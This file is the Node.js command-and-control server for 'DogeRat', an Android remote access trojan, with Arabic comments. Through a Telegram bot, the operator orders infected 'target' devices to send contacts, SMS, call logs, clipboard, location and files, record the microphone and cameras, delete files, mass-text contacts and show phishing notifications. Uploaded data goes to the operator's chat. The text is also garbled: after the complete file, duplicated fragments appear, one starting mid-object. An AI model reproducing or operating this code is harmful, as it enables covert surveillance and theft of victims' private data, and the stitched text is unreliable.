const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

// تحميل متغيرات البيئة
require('dotenv').config();

// الإعدادات - استخدام متغيرات البيئة أو القيم الافتراضية
const token = process.env.TELEGRAM_BOT_TOKEN || '';
const id = process.env.TELEGRAM_CHAT_ID || '';
const address = process.env.PING_ADDRESS || 'https://www.google.com';
const PORT = process.env.PORT || 8999;

// التحقق من الإعدادات
if (!token || token === 'telegram_bot_token_here') {
    console.error('خطأ: لم يتم تكوين TELEGRAM_BOT_TOKEN!');
    console.error('يرجى تعيين متغير البيئة TELEGRAM_BOT_TOKEN');
}
if (!id || id === 'telegram_chatid-here') {
    console.warn('تحذير: لم يتم تكوين TELEGRAM_CHAT_ID!');
    console.warn('لن يقوم البوت بإرسال رسائل لأي شخص حتى يتم تعيين معرف الدردشة');
}

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ 
    server: appServer,
    perMessageDeflate: false,
    clientTracking: true
});

let appBot = null;
try {
    appBot = new telegramBot(token, { polling: true });
    console.log('تم تشغيل بوت التيليجرام بنجاح');
} catch (error) {
    console.error('فشل في تشغيل بوت التيليجرام:', error.message);
}

const appClients = new Map();

const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 } // حد 50 ميجابايت
});
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// نقطة فحص الحالة
app.get('/', function (req, res) {
    res.send('<h1 align="center">خادم DogeRat v1.0.0</h1><p>الحالة: متصل</p>');
});

// نقطة الحالة
app.get('/status', function (req, res) {
    res.json({
        status: 'online',
        connectedDevices: appClients.size,
        uptime: process.uptime()
    });
});

// نقطة رفع الملفات
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('لم يتم رفع أي ملف');
        }
        
        const name = req.file.originalname || 'ملف_غير_معروف';
        const model = req.headers.model || 'جهاز غير معروف';
        
        if (appBot && id) {
            appBot.sendDocument(id, req.file.buffer, {
                caption: `°• رسالة من جهاز <b>${model}</b>`,
                parse_mode: "HTML"
            }, {
                filename: name,
                contentType: 'application/octet-stream',
            }).catch(err => console.error('خطأ في إرسال المستند:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع الملف:', error.message);
        res.status(500).send('خطأ في رفع الملف');
    }
});

// نقطة رفع النصوص
app.post("/uploadText", (req, res) => {
    try {
        const model = req.headers.model || 'جهاز غير معروف';
        const text = req.body['text'] || '';
        
        if (appBot && id) {
            appBot.sendMessage(id, `°• رسالة من جهاز <b>${model}</b>\n\n` + text, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('خطأ في إرسال الرسالة:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع النص:', error.message);
        res.status(500).send('خطأ في رفع النص');
    }
});

// نقطة رفع الموقع
app.post("/uploadLocation", (req, res) => {
    try {
        const lat = req.body['lat'];
        const lon = req.body['lon'];
        const model = req.headers.model || 'جهاز غير معروف';
        
        if (appBot && id && lat && lon) {
            appBot.sendLocation(id, lat, lon).catch(err => console.error('خطأ في إرسال الموقع:', err.message));
            appBot.sendMessage(id, `°• موقع من جهاز <b>${model}</b>`, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('خطأ في إرسال رسالة الموقع:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع الموقع:', error.message);
        res.status(500).send('خطأ في رفع الموقع');
    }
});

// معالجة اتصال WebSocket
appSocket.on('connection', (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = req.headers.model || 'جهاز غير معروف';
        const battery = req.headers.battery || '0';
        const version = req.headers.version || 'غير معروف';
        const brightness = req.headers.brightness || '0';
        const provider = req.headers.provider || 'غير معروف';

        ws.uuid = uuid;
        ws.isAlive = true;
        
        appClients.set(uuid, {
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
            connectedAt: new Date().toISOString()
        });
        
        console.log(`جهاز متصل: ${model} (${uuid})`);
        
        if (appBot && id) {
            appBot.sendMessage(id,
                `°• تم اتصال جهاز جديد\n\n` +
                `• موديل الجهاز : <b>${model}</b>\n` +
                `• البطارية : <b>${battery}</b>\n` +
                `• إصدار أندرويد : <b>${version}</b>\n` +
                `• سطوع الشاشة : <b>${brightness}</b>\n` +
                `• المزود : <b>${provider}</b>`,
                { parse_mode: "HTML" }
            ).catch(err => console.error('خطأ في إرسال رسالة الاتصال:', err.message));
        }

        ws.on('pong', () => {
            ws.isAlive = true;
        });

        ws.on('close', function () {
            console.log(`فصل الجهاز: ${model} (${uuid})`);
            
            if (appBot && id) {
                appBot.sendMessage(id,
                    `°• تم فصل الجهاز\n\n` +
                    `• موديل الجهاز : <b>${model}</b>\n` +
                    `• البطارية : <b>${battery}</b>\n` +
                    `• إصدار أندرويد : <b>${version}</b>\n` +
                    `• سطوع الشاشة : <b>${brightness}</b>\n` +
                    `• المزود : <b>${provider}</b>`,
                    { parse_mode: "HTML" }
                ).catch(err => console.error('خطأ في إرسال رسالة الفصل:', err.message));
            }
            appClients.delete(ws.uuid);
        });

        ws.on('error', function (error) {
            console.error(`خطأ WebSocket للجهاز ${model}:`, error.message);
        });
        
    } catch (error) {
        console.error('خطأ في معالجة الاتصال:', error.message);
    }
});

// نبضات القلب للكشف عن العملاء المنفصلين
const heartbeatInterval = setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            console.log(`إنهاء الاتصال الميت: ${ws.uuid}`);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

appSocket.on('close', () => {
    clearInterval(heartbeatInterval);
});

// معالجة رسائل بوت التيليجرام
if (appBot) {
    appBot.on('message', (message) => {
        try {
            const chatId = message.chat.id;
            
            // معالجة رسائل الرد
            if (message.reply_to_message) {
                handleReplyMessage(message, chatId);
            }
            
            // معالجة رسائل الأوامر
            if (id && chatId.toString() === id.toString()) {
                handleCommandMessage(message, chatId);
            } else if (message.text === '/start' || message.text?.startsWith('/')) {
                // السماح فقط بأمر /start للمستخدمين غير المصرح لهم
                if (message.text === '/start') {
                    appBot.sendMessage(chatId,
                        '°• الوصول مرفوض\n\n' +
                        '• هذا البوت خاص. اتصل بالمسؤول للوصول.',
                        { parse_mode: "HTML" }
                    ).catch(err => console.error('خطأ:', err.message));
                }
            }
        } catch (error) {
            console.error('خطأ في معالجة الرسالة:', error.message);
        }
    });

    appBot.on("callback_query", (callbackQuery) => {
        try {
            handleCallbackQuery(callbackQuery);
        } catch (error) {
            console.error('خطأ في استعلام رد الاتصال:', error.message);
        }
    });

    appBot.on('error', (error) => {
        console.error('خطأ في البوت:', error.message);
    });

    appBot.on('polling_error', (error) => {
        console.error('خطأ في الاستطلاع:', error.message);
    });
}

function handleReplyMessage(message, chatId) {
    if (!id || chatId.toString() !== id.toString()) return;
    
    const replyText = message.reply_to_message?.text || '';
    
    if (replyText.includes('°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
            '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم')) {
        sendToDevice(currentUuid, `send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
        sendToDevice(currentUuid, `send_message_to_all:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل مسار الملف الذي تريد تحميله')) {
        sendToDevice(currentUuid, `file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
        sendToDevice(currentUuid, `delete_file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
        const duration = parseInt(message.text);
        if (!isNaN(duration) && duration > 0) {
            sendToDevice(currentUuid, `microphone:${duration}`);
        } else {
            appBot.sendMessage(id, '°• مدة غير صالحة. يرجى إدخال رقم صحيح بالثواني.').catch(() => {});
        }
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها')) {
        sendToDevice(currentUuid, `rec_camera_main:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها')) {
        sendToDevice(currentUuid, `rec_camera_selfie:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف')) {
        currentTitle = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
            '• عندما ينقر الضحية على الإشعار، سيتم فتح الرابط الذي تدخله',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار')) {
        sendToDevice(currentUuid, `show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
        sendToDevice(currentUuid, `play_audio:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
}

function handleCommandMessage(message, chatId) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '°• مرحباً بك في لوحة تحكم Rat\n\n' +
            '• إذا كان التطبيق مثبتاً على الجهاز المستهدف، انتظر الاتصال\n\n' +
            '• عندما تتلقى رسالة الاتصال، فهذا يعني أن الجهاز المستهدف متصل وجاهز لتلقي الأوامر\n\n' +
            '• انقر على زر الأوامر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب من بين الأوامر\n\n' +
            '• إذا علقت في مكان ما في البوت، أرسل أمر /start',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (message.text === 'الأجهزة المتصلة') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة متاحة\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('خطأ:', err.message));
        } else {
            let text = '°• قائمة الأجهزة المتصلة :\n\n';
            appClients.forEach(function (value, key, map) {
                text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                    `• البطارية : <b>${value.battery}</b>\n` +
                    `• إصدار أندرويد : <b>${value.version}</b>\n` +
                    `• سطوع الشاشة : <b>${value.brightness}</b>\n` +
                    `• المزود : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, { parse_mode: "HTML" }).catch(err => console.error('خطأ:', err.message));
        }
    }
    
    if (message.text === 'تنفيذ أمر') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة متاحة\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('خطأ:', err.message));
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key, map) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(id, '°• حدد الجهاز لتنفيذ الأمر', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            }).catch(err => console.error('خطأ:', err.message));
        }
    }
}

function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (!id) return;

    const commandHandlers = {
        'device': () => {
            const deviceInfo = appClients.get(uuid);
            if (!deviceInfo) {
                appBot.sendMessage(id, '°• الجهاز غير موجود أو منفصل').catch(() => {});
                return;
            }
            appBot.editMessageText(`°• حدد أمراً للجهاز : <b>${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'التطبيقات', callback_data: `apps:${uuid}` },
                            { text: 'معلومات الجهاز', callback_data: `device_info:${uuid}` }
                        ],
                        [
                            { text: 'جلب ملف', callback_data: `file:${uuid}` },
                            { text: 'حذف ملف', callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: 'الحافظة', callback_data: `clipboard:${uuid}` },
                            { text: 'الميكروفون', callback_data: `microphone:${uuid}` },
                        ],
                        [
                            { text: 'الكاميرا الرئيسية', callback_data: `camera_main:${uuid}` },
                            { text: 'كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: 'الموقع', callback_data: `location:${uuid}` },
                            { text: 'رسالة توست', callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: 'المكالمات', callback_data: `calls:${uuid}` },
                            { text: 'جهات الاتصال', callback_data: `contacts:${uuid}` }
                        ],
                        [
                            { text: 'اهتزاز', callback_data: `vibrate:${uuid}` },
                            { text: 'إظهار إشعار', callback_data: `show_notification:${uuid}` }
                        ],
                        [
                            { text: 'الرسائل', callback_data: `messages:${uuid}` },
                            { text: 'إرسال رسالة', callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: 'تشغيل صوت', callback_data: `play_audio:${uuid}` },
                            { text: 'إيقاف الصوت', callback_data: `stop_audio:${uuid}` },
                        ],
                        [
                            {
                                text: 'إرسال رسالة لجميع جهات الاتصال',
                                callback_data: `send_message_to_all:${uuid}`
                            }
                        ],
                    ]
                },
                parse_mode: "HTML"
            }).catch(err => console.error('خطأ:', err.message));
        },
        'calls': () => {
            sendToDevice(uuid, 'calls');
            deleteAndSendProcessing(msg.message_id);
        },
        'contacts': () => {
            sendToDevice(uuid, 'contacts');
            deleteAndSendProcessing(msg.message_id);
        },
        'messages': () => {
            sendToDevice(uuid, 'messages');
            deleteAndSendProcessing(msg.message_id);
        },
        'apps': () => {
            sendToDevice(uuid, 'apps');
            deleteAndSendProcessing(msg.message_id);
        },
        'device_info': () => {
            sendToDevice(uuid, 'device_info');
            deleteAndSendProcessing(msg.message_id);
        },
        'clipboard': () => {
            sendToDevice(uuid, 'clipboard');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_main': () => {
            sendToDevice(uuid, 'camera_main');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_selfie': () => {
            sendToDevice(uuid, 'camera_selfie');
            deleteAndSendProcessing(msg.message_id);
        },
        'location': () => {
            sendToDevice(uuid, 'location');
            deleteAndSendProcessing(msg.message_id);
        },
        'vibrate': () => {
            sendToDevice(uuid, 'vibrate');
            deleteAndSendProcessing(msg.message_id);
        },
        'stop_audio': () => {
            sendToDevice(uuid, 'stop_audio');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه\n\n' +
                '• إذا كنت تريد إرسال رسالة نصية قصيرة إلى أرقام محلية، يمكنك إدخال الرقم مع صفر في البداية، وإلا أدخل الرقم مع رمز الدولة',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'send_message_to_all': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
                '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد تحميله\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لاستلام ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'delete_file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'microphone': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n' +
                '• لاحظ أنه يجب عليك إدخال الوقت رقمياً بوحدات الثواني',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'toast': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف\n\n' +
                '• رسالة التوست هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'show_notification': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
                '• ستظهر رسالتك في شريط حالة الجهاز المستهدف مثل الإشعارات العادية',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'play_audio': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
                '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        }
    };

    if (commandHandlers[commend]) {
        commandHandlers[commend]();
    }
}

function sendToDevice(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

function deleteAndSendProcessing(messageId) {
    if (appBot && id) {
        appBot.deleteMessage(id, messageId).catch(() => {});
        sendProcessingMessage();
    }
}

function sendProcessingMessage() {
    if (appBot && id) {
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• ستتلقى رداً في اللحظات القليلة القادمة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
}

// نبضة بقاء الاتصال
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    
    // اختياري: إبقاء الخادم مستيقظاً عن طريق إرسال طلب لخدمة خارجية
    if (address) {
        axios.get(address).catch(() => {
            // تجاهل الأخطاء من الطلب
        });
    }
}, 5000);

// إغلاق آمن
process.on('SIGTERM', () => {
    console.log('تم استلام إشارة SIGTERM: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('تم استلام إشارة SIGINT: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

// بدء الخادم
appServer.listen(PORT, () => {
    console.log(`خادم DogeRat v1.0.0 يعمل على المنفذ ${PORT}`);
    console.log(`ستظهر الأجهزة المتصلة هنا`);
});
        },
        'clipboard': () => {
            sendToDevice(uuid, 'clipboard');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_main': () => {
            sendToDevice(uuid, 'camera_main');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_selfie': () => {
            sendToDevice(uuid, 'camera_selfie');
            deleteAndSendProcessing(msg.message_id);
        },
        'location': () => {
            sendToDevice(uuid, 'location');
            deleteAndSendProcessing(msg.message_id);
        },
        'vibrate': () => {
            sendToDevice(uuid, 'vibrate');
            deleteAndSendProcessing(msg.message_id);
        },
        'stop_audio': () => {
            sendToDevice(uuid, 'stop_audio');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه\n\n' +
                '• إذا كنت تريد إرسال رسالة نصية قصيرة إلى أرقام محلية، يمكنك إدخال الرقم مع صفر في البداية، وإلا أدخل الرقم مع رمز الدولة',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'send_message_to_all': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
                '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد تحميله\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لاستلام ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'delete_file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'microphone': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n' +
                '• لاحظ أنه يجب عليك إدخال الوقت رقمياً بوحدات الثواني',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'toast': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف\n\n' +
                '• رسالة التوست هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'show_notification': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
                '• ستظهر رسالتك في شريط حالة الجهاز المستهدف مثل الإشعارات العادية',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'play_audio': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
                '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        }
    };

    if (commandHandlers[commend]) {
        commandHandlers[commend]();
    }
}

function sendToDevice(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

function deleteAndSendProcessing(messageId) {
    if (appBot && id) {
        appBot.deleteMessage(id, messageId).catch(() => {});
        sendProcessingMessage();
    }
}

function sendProcessingMessage() {
    if (appBot && id) {
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• ستتلقى رداً في اللحظات القليلة القادمة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
}

// نبضة بقاء الاتصال
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    
    // اختياري: إبقاء الخادم مستيقظاً عن طريق إرسال طلب لخدمة خارجية
    if (address) {
        axios.get(address).catch(() => {
            // تجاهل الأخطاء من الطلب
        });
    }
}, 5000);

// إغلاق آمن
process.on('SIGTERM', () => {
    console.log('تم استلام إشارة SIGTERM: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('تم استلام إشارة SIGINT: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

// بدء الخادم
appServer.listen(PORT, () => {
    console.log(`خادم DogeRat v1.0.0 يعمل على المنفذ ${PORT}`);
    console.log(`ستظهر الأجهزة المتصلة هنا`);
});
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

// تحميل متغيرات البيئة
require('dotenv').config();

// الإعدادات - استخدام متغيرات البيئة أو القيم الافتراضية
const token = process.env.TELEGRAM_BOT_TOKEN || '';
const id = process.env.TELEGRAM_CHAT_ID || '';
const address = process.env.PING_ADDRESS || 'https://www.google.com';
const PORT = process.env.PORT || 8999;

// التحقق من الإعدادات
if (!token || token === 'telegram_bot_token_here') {
    console.error('خطأ: لم يتم تكوين TELEGRAM_BOT_TOKEN!');
    console.error('يرجى تعيين متغير البيئة TELEGRAM_BOT_TOKEN');
}
if (!id || id === 'telegram_chatid-here') {
    console.warn('تحذير: لم يتم تكوين TELEGRAM_CHAT_ID!');
    console.warn('لن يقوم البوت بإرسال رسائل لأي شخص حتى يتم تعيين معرف الدردشة');
}

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ 
    server: appServer,
    perMessageDeflate: false,
    clientTracking: true
});

let appBot = null;
try {
    appBot = new telegramBot(token, { polling: true });
    console.log('تم تشغيل بوت التيليجرام بنجاح');
} catch (error) {
    console.error('فشل في تشغيل بوت التيليجرام:', error.message);
}

const appClients = new Map();

const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 } // حد 50 ميجابايت
});
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// نقطة فحص الحالة
app.get('/', function (req, res) {
    res.send('<h1 align="center">خادم DogeRat v1.0.0</h1><p>الحالة: متصل</p>');
});

// نقطة الحالة
app.get('/status', function (req, res) {
    res.json({
        status: 'online',
        connectedDevices: appClients.size,
        uptime: process.uptime()
    });
});

// نقطة رفع الملفات
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('لم يتم رفع أي ملف');
        }
        
        const name = req.file.originalname || 'ملف_غير_معروف';
        const model = req.headers.model || 'جهاز غير معروف';
        
        if (appBot && id) {
            appBot.sendDocument(id, req.file.buffer, {
                caption: `°• رسالة من جهاز <b>${model}</b>`,
                parse_mode: "HTML"
            }, {
                filename: name,
                contentType: 'application/octet-stream',
            }).catch(err => console.error('خطأ في إرسال المستند:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع الملف:', error.message);
        res.status(500).send('خطأ في رفع الملف');
    }
});

// نقطة رفع النصوص
app.post("/uploadText", (req, res) => {
    try {
        const model = req.headers.model || 'جهاز غير معروف';
        const text = req.body['text'] || '';
        
        if (appBot && id) {
            appBot.sendMessage(id, `°• رسالة من جهاز <b>${model}</b>\n\n` + text, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('خطأ في إرسال الرسالة:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع النص:', error.message);
        res.status(500).send('خطأ في رفع النص');
    }
});

// نقطة رفع الموقع
app.post("/uploadLocation", (req, res) => {
    try {
        const lat = req.body['lat'];
        const lon = req.body['lon'];
        const model = req.headers.model || 'جهاز غير معروف';
        
